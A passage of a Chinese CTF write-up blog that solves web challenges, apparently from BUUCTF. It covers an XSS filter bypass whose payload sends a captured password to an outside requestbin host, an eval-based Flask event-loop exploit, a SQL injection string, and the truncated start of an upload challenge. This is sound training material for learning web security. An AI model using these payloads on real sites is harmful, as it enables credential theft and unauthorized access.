<p>有反馈，合理怀疑XSS</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('反馈不合法');&lt;/script>"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'#'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'script'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'iframe'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'onload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'onerror'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'srcdoc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'svg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'form'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'getElement'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'document'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$feedback</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$feedback</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$feedback</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt scookierc<span class="token operator">=</span><span class="token string">"./js/login.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt<span class="token operator">></span>    <span class="token keyword">var</span> psw <span class="token operator">=</span> docucookiement<span class="token punctuation">.</span><span class="token function">getcookieElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/1is06vp1/?a="</span><span class="token operator">+</span>psw<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="DDCTF-2019-homebrew-event-loop"   >          <a href="#DDCTF-2019-homebrew-event-loop" class="heading-link"><i class="fas fa-link"></i></a><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2>      <p>欣赏源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span><span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span><span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event    <span class="token keyword">else</span><span class="token punctuation">:</span>        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#增加num_items</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#最终拿flag</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看源码中各个函数的功能，写到注释中了，可以看到如果需要拿flag就要调用<code>get_flag_handler</code>，而如果要执行就需要有5个<code>num_items</code>，通过<code>buy_handler</code>函数来增加<code>num_items</code>，但是钱不够，此时我们通过执行<code>trigger_event</code>函数来进行多函数执行，在进行扣费之前就拿取到flag</p><pre class="line-numbers language-none"><code class="language-none">?action:trigger_event#;action:buy;5#action:get_flag;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时session已经被写入cookie了，由于该flask程序中并没有使用数据库，所以session中的内容实际上是储存在我们的cookie中（<span class="exturl"><a class="exturl__link"   href="https://www.leavesongs.com/PENETRATION/client-session-security.html" >戳这里看详情</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>）得到session内容并使用<code>flask-session-cookie-manager</code>工具进行解密，拿到flag</p>        <h2 id="RootersCTF2019-babyWeb"   >          <a href="#RootersCTF2019-babyWeb" class="heading-link"><i class="fas fa-link"></i></a><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2>      <p>SQL注入，过滤已提醒<code>UNION SLEEP &#39; &quot; OR - BENCHMARK</code></p><p>先用order by测出列数，再用万能密码捞出flag</p><pre class="line-numbers language-none"><code class="language-none">1 || 1&#x3D;1 limit 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="HFCTF2020-BabyUpload"   >          <a href="#HFCTF2020-BabyUpload" class="heading-link"><i class="fas fa-link"></i></a><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2>      <p>源码先扔</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span 